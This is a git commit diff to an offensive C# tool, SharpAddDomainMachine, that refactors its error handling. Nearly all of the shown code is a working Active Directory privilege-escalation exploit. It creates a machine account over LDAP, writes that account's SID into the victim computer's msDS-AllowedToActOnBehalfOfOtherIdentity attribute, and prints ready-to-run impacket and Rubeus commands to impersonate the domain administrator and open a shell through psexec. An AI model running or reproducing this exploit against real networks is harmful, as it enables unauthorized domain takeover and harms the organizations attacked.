dbf1c414dc001ef5656d7328336231647c101e34
Evi1cg <zuotonghk@gmail.com>
2020-03-31 00:36:33 +0800

    update code

--- SharpAddDomainMachine/Program.cs
+++ SharpAddDomainMachine/Program.cs
@@ -104,43 +104,44 @@ namespace SharpAddDomainMachine
             Console.WriteLine("[+] Elevate permissions on " + victimcomputer);
             Console.WriteLine("[+] Domain = " + Domain);
             Console.WriteLine("[+] Domain Controller = " + DomainController);
-            Console.WriteLine("[+] New SAMAccountName = " + sam_account);
             //Console.WriteLine("[+] Distinguished Name = " + distinguished_name);
-            //连接ldap
-            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
-            //NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录
-            System.DirectoryServices.Protocols.LdapConnection connection = null;
-            //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);
-            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);
-            connection.SessionOptions.Sealing = true;
-            connection.SessionOptions.Signing = true;
-            connection.Bind();
-            //通过ldap找计算机
-            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain);
-            myldapConnection.Path = "LDAP://" + victim_distinguished_name;
-            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
-            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
-            search.Filter = "(CN=" + victimcomputer + ")";
-            string[] requiredProperties = new string[] { "samaccountname" };
-            foreach (String property in requiredProperties)
-                search.PropertiesToLoad.Add(property);
-            System.DirectoryServices.SearchResult result = null;
-            try
-            {
-                result = search.FindOne();
-            }
-            catch (System.Exception ex)
-            {
-                Console.WriteLine(ex.Message + "[-] Exiting...");
-                return;
-            }
-
-            //添加机器并设置资源约束委派
-            if (result != null)
-            {
+            try{
+                //连接ldap
+                System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
+                //NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录
+                System.DirectoryServices.Protocols.LdapConnection connection = null;
+                //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);
+                connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);
+                connection.SessionOptions.Sealing = true;
+                connection.SessionOptions.Signing = true;
+                connection.Bind();
+                //通过ldap找计算机
+                System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain);
+                myldapConnection.Path = "LDAP://" + victim_distinguished_name;
+                myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
+                System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
+                search.Filter = "(CN=" + victimcomputer + ")";
+                string[] requiredProperties = new string[] { "samaccountname" };
+                foreach (String property in requiredProperties)
+                    search.PropertiesToLoad.Add(property);
+                System.DirectoryServices.SearchResult result = null;
                 try
                 {
-                    var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
+                    result = search.FindOne();
+                }
+                catch (System.Exception ex)
+                {
+                    Console.WriteLine("[!] " +ex.Message + "\n[-] Exiting...");
+                    return;
+                }
+
+                //添加机器并设置资源约束委派
+                if (result != null)
+                {
+                    try
+                    {
+                        
+                        var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
                 new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
                 new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
                 new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
@@ -148,71 +149,80 @@ namespace SharpAddDomainMachine
                 new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
                 new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)
             });
-                    //添加机器账户
-                    connection.SendRequest(request);
-                    Console.WriteLine("[+] Machine account: " + machine_account + " Password: " + new_MachineAccount_password + " added");
-                }
-                catch (System.Exception ex)
-                {
-                    Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)");
-                    Console.WriteLine("[-] Exception: " + ex.Message);
-                    return;
-                }
-                // 获取新计算机对象的SID
-                var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
-                var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
-                SecurityIdentifier sid = null;
-                foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
-                {
-                    try
-                    {
-                        sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
-                        Console.Out.WriteLine("[+] " + new_MachineAccount + " SID : " + sid.Value);
+                        //添加机器账户
+                        connection.SendRequest(request);
+                        Console.WriteLine("[+] New SAMAccountName = " + sam_account);
+                        Console.WriteLine("[+] Machine account: " + machine_account + " Password: " + new_MachineAccount_password + " added");
                     }
-                    catch
+                    catch (System.Exception ex)
                     {
-                        Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
+                        Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)");
+                        Console.WriteLine("[-] Exception: " + ex.Message);
                         return;
                     }
-                }
-                //设置资源约束委派
-                String sec_descriptor = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid.Value + ")";
-                RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
-                byte[] buffer = new byte[sd.BinaryLength];
-		        sd.GetBinaryForm (buffer, 0);
-                //测试sddl转换结果
-                //RawSecurityDescriptor test_back = new RawSecurityDescriptor (buffer, 0);
-                //Console.WriteLine(test_back.GetSddlForm(AccessControlSections.All));
-                // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中
-               try
-                {
-                    var change_request = new System.DirectoryServices.Protocols.ModifyRequest();
-                    change_request.DistinguishedName = victim_distinguished_name;
-                    DirectoryAttributeModification modifymsDS = new DirectoryAttributeModification();
-                    modifymsDS.Operation = DirectoryAttributeOperation.Replace;
-                    modifymsDS.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity";
-                    modifymsDS.Add(buffer);
-                    change_request.Modifications.Add(modifymsDS);
-                    connection.SendRequest(change_request);
-                    Console.WriteLine("[+] Exploit successfully!\n");
-                    //打印利用方式
-                    Console.WriteLine("[+] Use impacket to get priv!\n\n[+] Command:\n");
-                    Console.WriteLine("\ngetST.py -dc-ip {0} {1}/{2}$:{3} -spn cifs/{4}.{5} -impersonate administrator", DomainController, Domain, machine_account, new_MachineAccount_password, victimcomputer, Domain);
-                    Console.WriteLine("\nexport KRB5CCNAME=administrator.ccache");
-                    Console.WriteLine("\npsexec.py {0}/administrator@{1}.{2} -k -no-pass", Domain, victimcomputer, Domain);
-                    Console.WriteLine("\n\n[+] Use Rubeus.exe to get priv!\n\n[+] Command:\n");
-                    Console.WriteLine("\nRubeus.exe hash /user:{0} /password:{1} /domain:{2}",machine_account,new_MachineAccount_password, Domain);
-                    Console.WriteLine("\nRubeus.exe s4u /user:{0} /rc4:rc4_hmac /impersonateuser:administrator /msdsspn:cifs/{1}.{2} /ptt /dc:{3}", machine_account, victimcomputer, Domain, DomainController);
-                    Console.WriteLine("\npsexec.exe \\\\{0}.{1} cmd ", victimcomputer, Domain);
-                }
-                catch (System.Exception ex)
-                {
-                    Console.WriteLine("[!] Error: "+ ex.Message + " "+ ex.InnerException);
-                    Console.WriteLine("[!] Failed...");
-                    return;
-                }
+                    // 获取新计算机对象的SID
+                    var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
+                    var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
+                    SecurityIdentifier sid = null;
+                    foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
+                    {
+                        try
+                        {
+                            sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
+                            Console.Out.WriteLine("[+] " + new_MachineAccount + " SID : " + sid.Value);
+                        }
+                        catch
+                        {
+                            Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
+                            return;
+                        }
+                    }
+                    //设置资源约束委派
+                    String sec_descriptor = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid.Value + ")";
+                    RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
+                    byte[] buffer = new byte[sd.BinaryLength];
+                    sd.GetBinaryForm(buffer, 0);
+                    //测试sddl转换结果
+                    //RawSecurityDescriptor test_back = new RawSecurityDescriptor (buffer, 0);
+                    //Console.WriteLine(test_back.GetSddlForm(AccessControlSections.All));
+                    // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中
+                    try
+                    {
+                        var change_request = new System.DirectoryServices.Protocols.ModifyRequest();
+                        change_request.DistinguishedName = victim_distinguished_name;
+                        DirectoryAttributeModification modifymsDS = new DirectoryAttributeModification();
+                        modifymsDS.Operation = DirectoryAttributeOperation.Replace;
+                        modifymsDS.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity";
+                        modifymsDS.Add(buffer);
+                        change_request.Modifications.Add(modifymsDS);
+                        connection.SendRequest(change_request);
+                        Console.WriteLine("[+] Exploit successfully!\n");
+                        //打印利用方式
+                        Console.WriteLine("[+] Use impacket to get priv!\n");
+                        Console.WriteLine("\ngetST.py -dc-ip {0} {1}/{2}$:{3} -spn cifs/{4}.{5} -impersonate administrator", DomainController, Domain, machine_account, new_MachineAccount_password, victimcomputer, Domain);
+                        Console.WriteLine("\nexport KRB5CCNAME=administrator.ccache");
+                        Console.WriteLine("\npsexec.py {0}/administrator@{1}.{2} -k -no-pass", Domain, victimcomputer, Domain);
+                        Console.WriteLine("\n\n[+] Use Rubeus.exe to get priv!\n");
+                        Console.WriteLine("\nRubeus.exe hash /user:{0} /password:{1} /domain:{2}", machine_account, new_MachineAccount_password, Domain);
+                        Console.WriteLine("\nRubeus.exe s4u /user:{0} /rc4:rc4_hmac /impersonateuser:administrator /msdsspn:cifs/{1}.{2} /ptt /dc:{3}", machine_account, victimcomputer, Domain, DomainController);
+                        Console.WriteLine("\npsexec.exe \\\\{0}.{1} cmd ", victimcomputer, Domain);
+                        Console.WriteLine("\n[+] Done..");
+                    }
+                    catch (System.Exception ex)
+                    {
+                        Console.WriteLine("[!] Error: " + ex.Message + " " + ex.InnerException);
+                        Console.WriteLine("[!] Failed...");
+                        return;
+                    }
 
+                }
             }
+            catch (System.Exception ex){
+                Console.WriteLine("[!] "+ ex.Message + "\n[-] Exiting...");
+                return;
+            }
+           
+           
         }
     }
 }
